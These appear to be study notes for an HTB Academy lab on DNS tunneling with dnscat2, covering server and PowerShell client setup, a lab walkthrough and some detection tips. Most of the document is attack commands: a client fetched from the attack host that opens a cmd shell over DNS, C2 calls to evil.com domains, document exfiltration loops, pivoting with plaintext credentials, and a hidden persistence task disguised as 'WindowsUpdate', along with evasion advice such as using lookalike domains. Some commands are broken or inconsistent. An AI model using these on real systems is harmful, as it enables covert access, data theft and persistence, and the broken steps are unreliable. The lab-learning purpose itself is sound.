# **DNS Tunneling with Dnscat2 - HTB Academy Page 12**

## **📋 Module Overview**

**Purpose:** Covert communication through DNS protocol tunneling  
**Tool:** dnscat2 - DNS tunnel for encrypted C&C channels  
**Protocol:** DNS (TXT records for data transmission)  
**Advantage:** Bypasses firewalls, uses legitimate DNS traffic  
**Use Case:** Stealth communication, data exfiltration, C2 channels  

---

## **1. Introduction to DNS Tunneling**

### **What is DNS Tunneling?**
- **Protocol:** Uses DNS queries and responses for data transmission
- **Stealth:** Appears as legitimate DNS traffic to firewalls
- **Encryption:** Supports encrypted communication channels
- **Records:** Data embedded in DNS TXT records
- **Bidirectional:** Full two-way communication support

### **How DNS Tunneling Works**
```
[Client] → [DNS Query with Data] → [DNS Server] → [dnscat2 Server]
         ← [DNS Response with Data] ←              ←
```

### **Why DNS Tunneling is Effective**
1. **DNS is Essential** - rarely blocked by firewalls
2. **Appears Legitimate** - looks like normal DNS resolution
3. **Encrypted Communication** - data protection
4. **Protocol Abuse** - legitimate protocol for covert use
5. **Firewall Bypass** - evades deep packet inspection

### **Network Environment Context**
- **Corporate Networks** - internal DNS servers
- **Active Directory** - domain-based DNS resolution
- **External Queries** - data exfiltration opportunity
- **Monitoring Gaps** - DNS traffic often unmonitored

---

## **2. Dnscat2 Architecture**

### **Components**
1. **dnscat2 Server** - runs on attack host (Ruby-based)
2. **dnscat2 Client** - runs on target (C binary or PowerShell)
3. **DNS Infrastructure** - leverages existing DNS servers
4. **Encryption Layer** - pre-shared secret authentication

### **Communication Flow**
```
[Target Host] → [Local DNS] → [External DNS] → [Attack Host]
dnscat2-ps1     DNS Server     DNS Server      dnscat2 Server
PowerShell      Forwards       Routes          Ruby Process
Client          Queries        Queries         :53/UDP
```

### **dnscat2 vs Traditional Tunneling**

| **Aspect** | **dnscat2** | **SSH Tunnel** | **HTTP Tunnel** |
|------------|-------------|----------------|-----------------|
| **Protocol** | DNS | SSH | HTTP/HTTPS |
| **Stealth** | Very High | Medium | High |
| **Firewall Bypass** | Excellent | Limited | Good |
| **Setup Complexity** | Medium | Low | Medium |
| **Performance** | Low | High | Medium |
| **Detection Difficulty** | Hard | Easy | Medium |

---

## **3. Setting Up Dnscat2 Server**

### **Installation on Attack Host**

#### **Primary Method: Git Clone (Recommended - HTB Academy Method)**
```bash
# HTB Academy official method - works with modern Ruby versions
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/

# Install Ruby dependencies
sudo gem install bundler
sudo bundle install

# Verify installation
ls -la
# dnscat2.rb server file should be present

# Test server startup
sudo ruby dnscat2.rb --help
```

#### **Alternative Method: System Packages (May Have Issues)**
```bash
# System packages may have Ruby 3.x compatibility issues
sudo apt update
sudo apt install dnscat2

# Known issues:
# - Ruby Bignum/Fixnum errors on Ruby 3.x
# - Outdated sha3 gem dependency (1.0.1 vs 1.0.5)
# - ARM architecture compilation problems

# If installed, verify with:
which dnscat2-server
dnscat2-server --help
```

#### **Issue Resolution for System Packages**
```bash
# If system package fails with Ruby errors:
# NameError: uninitialized constant Packet::EncBody::Bignum
# NameError: uninitialized constant DNSer::Packet::MX::Fixnum

# Solution: Use git version instead (recommended)
cd ~
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo bundle install
```

#### **Other Installation Methods**
```bash
# From Ruby gems
sudo gem install dnscat2

# Manual compilation (client)
cd ../client/
make
```

### **Starting the Dnscat2 Server**

#### **Basic Server Configuration**

**Method 1: System Package Command**
```bash
# Start dnscat2 server using system package
sudo dnscat2-server --dns host=10.10.14.18,port=53,domain=htblabs.local --no-cache

# Command breakdown:
# --dns host=IP        - server IP address
# port=53              - DNS port (standard)
# domain=DOMAIN        - domain for DNS queries
# --no-cache           - disable DNS caching
```

**Method 2: Manual Setup Command**
```bash
# Start dnscat2 server from cloned repository
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=htblabs.local --no-cache

# Same parameters as above
```

#### **Expected Server Output**
```
New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

**Important:** Note the **pre-shared secret** - `0ec04a91cd1e963f8c03ca499d589d21`

---

## **4. Dnscat2 PowerShell Client**

### **PowerShell Client Setup**

#### **Clone PowerShell Client**
```bash
# On attack host, clone PowerShell version
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Transfer to target Windows host
# Methods: SCP, HTTP download, file share, etc.
```

#### **Client File Transfer**
```bash
# Example transfer methods:

# 1. Python HTTP server on attack host
cd dnscat2-powershell/
python3 -m http.server 8000

# 2. SCP to intermediate host
scp dnscat2.ps1 user@target:/temp/

# 3. PowerShell download from target
# (Run on Windows target):
Invoke-WebRequest -Uri "http://10.10.14.18:8000/dnscat2.ps1" -OutFile "dnscat2.ps1"
```

### **Client Execution on Target**

#### **Import PowerShell Module**
```powershell
# Import dnscat2 PowerShell module
Import-Module .\dnscat2.ps1

# Verify module loaded
Get-Module dnscat2
```

#### **Establish DNS Tunnel**
```powershell
# Connect to dnscat2 server with encrypted session
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

# Parameters:
# -DNSserver: Attack host IP running dnscat2 server
# -Domain: Domain configured on server
# -PreSharedSecret: Generated secret from server
# -Exec cmd: Execute cmd.exe through tunnel
```

---

## **5. Interacting with DNS Tunnel**

### **Server-Side Session Management**

#### **Confirming Session Establishment**
```
# On dnscat2 server, you should see:
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

#### **Available Commands**
```bash
# List dnscat2 server commands
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo       - Echo test
* help       - Show help
* kill       - Kill session
* quit       - Quit server
* set        - Set variables
* start      - Start service
* stop       - Stop service
* tunnels    - List tunnels
* unset      - Unset variables
* window     - Switch windows
* windows    - List windows
```

#### **Session Interaction**
```bash
# List active sessions
dnscat2> windows

# Connect to specific session
dnscat2> window -i 1

# Expected output:
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

# Now you have direct shell access:
Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

---

## **6. HTB Academy Lab Exercise**

### **Lab Challenge**
**"Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer."**

### **Complete Solution Steps**

#### **Step 1: Setup Dnscat2 Server**
```bash
# On Pwnbox/Attack Host - install from system packages
sudo apt update
sudo apt install dnscat2

# Start server (replace IP with your Pwnbox IP)
sudo dnscat2-server --dns host=10.10.14.18,port=53,domain=htblabs.local --no-cache

# Alternative if using manual setup:
# git clone https://github.com/iagox86/dnscat2.git
# cd dnscat2/server/
# sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=htblabs.local --no-cache

# Note the generated pre-shared secret!
# Example: 0ec04a91cd1e963f8c03ca499d589d21
```

#### **Step 2: Download PowerShell Client**
```bash
# Clone PowerShell client
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Start HTTP server to serve client
cd dnscat2-powershell/
python3 -m http.server 8000
```

#### **Step 3: Connect to Target Windows Host**
```bash
# RDP to target Windows machine
xfreerdp /v:<target_ip> /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

#### **Step 4: Download and Execute Client**
```powershell
# In PowerShell on target machine
# Download dnscat2 client
Invoke-WebRequest -Uri "http://10.10.14.18:8000/dnscat2.ps1" -OutFile "dnscat2.ps1"

# Import module
Import-Module .\dnscat2.ps1

# Establish tunnel (use YOUR pre-shared secret!)
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain htblabs.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

#### **Step 5: Access Shell Through Tunnel**
```bash
# On attack host dnscat2 server
dnscat2> windows
dnscat2> window -i 1

# Now you have shell access through DNS tunnel
C:\Windows\system32> whoami
nt authority\system

# Navigate to flag location
C:\Windows\system32> cd C:\Users\htb-student\Documents

# Read flag content
C:\Users\htb-student\Documents> type flag.txt
```

#### **Step 6: Submit Answer**
```
Answer: [Contents of flag.txt file]
```

---

## **7. Advanced Dnscat2 Techniques**

### **Custom Domain Configuration**
```bash
# Using custom domain with authoritative DNS
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=evil.example.com

# Client connection to custom domain
Start-Dnscat2 -DNSserver ns.evil.example.com -Domain evil.example.com -PreSharedSecret <secret>
```

### **Multiple Session Management**
```bash
# List all active sessions
dnscat2> windows

# Create new session window
dnscat2> window -n "new_session"

# Switch between sessions
dnscat2> window -i 2

# Kill specific session
dnscat2> kill 1
```

### **File Transfer Through DNS**
```bash
# On dnscat2 server session
exec (client) 1> upload /local/file.txt C:\Windows\temp\file.txt

# Download file from client
exec (client) 1> download C:\Windows\temp\data.txt /tmp/exfiltrated.txt
```

### **Port Forwarding via DNS**
```bash
# Forward local port through DNS tunnel
dnscat2> set type=bind
dnscat2> set bind_host=127.0.0.1
dnscat2> set bind_port=8080
dnscat2> set target_host=172.16.5.19
dnscat2> set target_port=3389
```

---

## **8. Operational Security (OPSEC)**

### **Stealth Considerations**
1. **DNS Traffic Appears Normal** - blends with legitimate queries
2. **Encrypted Communication** - data protection
3. **Low Volume Traffic** - doesn't trigger bandwidth alerts
4. **Standard Port Usage** - port 53 is always allowed
5. **Protocol Abuse** - uses expected DNS behavior

### **Detection Risks**
1. **Unusual DNS Query Patterns** - high frequency to single domain
2. **TXT Record Analysis** - suspicious content in DNS responses
3. **DNS Traffic Volume** - excessive DNS queries
4. **Domain Reputation** - malicious domain detection
5. **Timing Analysis** - regular query intervals

### **Mitigation Strategies**
```bash
# Vary query timing
--delay 1000,5000  # Random delay between queries

# Use legitimate-looking domains
--domain microsoft-updates.com

# Limit session duration
# Connect, execute, disconnect quickly

# Rotate domains
# Use multiple domains for different sessions
```

---

## **9. Troubleshooting Dnscat2**

### **Common Issues**

#### **Server Won't Start**
```bash
# Problem: Port 53 already in use
Address already in use - bind(2) for "0.0.0.0" port 53

# Solutions:
1. Stop existing DNS service
   sudo systemctl stop systemd-resolved

2. Use different port
   sudo dnscat2-server --dns host=10.10.14.18,port=5353,domain=htblabs.local

3. Check what's using port 53
   sudo netstat -tulnp | grep :53
```

#### **Compilation Issues (ARM Systems)**
```bash
# Problem: ARM compilation errors with manual setup
cc1: error: unknown value 'nocona' for '-march'

# Solutions:
1. Use system packages instead (recommended)
   sudo apt install dnscat2

2. Fix compilation flags
   sudo gem install sha3 -- --with-cflags="-march=native"

3. Use Docker for cross-platform compatibility
   docker pull iagox86/dnscat2
```

#### **Client Connection Fails**
```powershell
# Problem: Cannot resolve server
DNS resolution failed

# Solutions:
1. Check server IP and domain
   nslookup htblabs.local 10.10.14.18

2. Test connectivity
   Test-NetConnection 10.10.14.18 -Port 53

3. Verify DNS server is running
   # Check attack host dnscat2 output
```

#### **PowerShell Module Import Fails**
```powershell
# Problem: Execution policy blocks script
Import-Module : File cannot be loaded because running scripts is disabled

# Solutions:
1. Change execution policy
   Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

2. Force import
   Import-Module .\dnscat2.ps1 -Force

3. Execute without import
   powershell -ExecutionPolicy Bypass -File dnscat2.ps1
```

#### **Session Encryption Issues**
```bash
# Problem: Pre-shared secret mismatch
Session security: UNENCRYPTED!

# Solutions:
1. Use correct secret from server output
2. Regenerate server secret
   sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53 --secret

3. Verify secret on both sides
   # Server shows secret on startup
   # Client must use exact same secret
```

---

## **10. Detection and Monitoring**

### **DNS Traffic Analysis**
```bash
# Monitor DNS queries for suspicious patterns
tcpdump -i any port 53 -A

# Analyze DNS logs
tail -f /var/log/dnsmasq.log | grep TXT

# Check for high-entropy DNS queries
# Look for base64-encoded data in queries
```

### **Network Monitoring**
```bash
# Monitor unusual DNS query volumes
netstat -s | grep -i dns

# Check for TXT record queries
dig TXT suspicious.domain.com

# Analyze query patterns
# Regular intervals, same source, unusual domains
```

### **PowerShell Logging**
```powershell
# Enable PowerShell logging
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational

# Check for suspicious module imports
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4103}

# Monitor network connections from PowerShell
Get-NetTCPConnection | Where-Object {$_.OwningProcess -eq (Get-Process powershell).Id}
```

---

## **11. Alternative DNS Tunneling Tools**

### **DNS Tunneling Tool Comparison**

| **Tool** | **Language** | **Features** | **Stealth** | **Performance** |
|----------|--------------|--------------|-------------|-----------------|
| **dnscat2** | Ruby/C | Full C2, encryption | High | Medium |
| **iodine** | C | IP over DNS | Medium | High |
| **dns2tcp** | C | TCP over DNS | Medium | High |
| **DNSStager** | PowerShell | Payload staging | High | Low |
| **dnscat2-powershell** | PowerShell | Windows-friendly | High | Low |

### **When to Use DNS Tunneling**
✅ **Restrictive firewall environments**  
✅ **Limited outbound connectivity**  
✅ **Need for stealth communication**  
✅ **Data exfiltration requirements**  
✅ **Long-term persistent access**  

### **When NOT to Use DNS Tunneling**
❌ **High bandwidth requirements**  
❌ **Real-time communication needs**  
❌ **DNS monitoring in place**  
❌ **Performance-critical operations**  
❌ **Short-term tactical access**  

---

## **12. Integration with Other Techniques**

### **DNS Tunneling + Lateral Movement**
```powershell
# Use DNS tunnel for credential harvesting
exec (client) 1> reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities

# Pivot through DNS tunnel
exec (client) 1> net use \\172.16.5.19\C$ /user:domain\admin password123

# Execute remote commands
exec (client) 1> wmic /node:172.16.5.19 process call create "cmd.exe /c whoami"
```

### **DNS Tunneling + Data Exfiltration**
```bash
# Exfiltrate files through DNS tunnel
# On dnscat2 server session:
download C:\Users\admin\Documents\sensitive.docx /tmp/exfiltrated/

# Batch file exfiltration
for file in C:\Users\*\Documents\*.pdf; do
    download "$file" "/tmp/exfiltrated/"
done
```

### **DNS Tunneling + Persistence**
```powershell
# Create scheduled task for DNS tunnel reconnection
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Import-Module C:\temp\dnscat2.ps1; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain evil.com -PreSharedSecret secret123'"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "Windows Update Task"
```

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 12
- **Dnscat2 GitHub**: [Official Repository](https://github.com/iagox86/dnscat2)
- **Dnscat2-PowerShell**: [PowerShell Client](https://github.com/lukebaggett/dnscat2-powershell)
- **DNS Protocol**: [RFC 1035 - Domain Names](https://tools.ietf.org/html/rfc1035)
- **DNS Security**: [SANS DNS Security](https://www.sans.org/blog/dns-security-threats/) 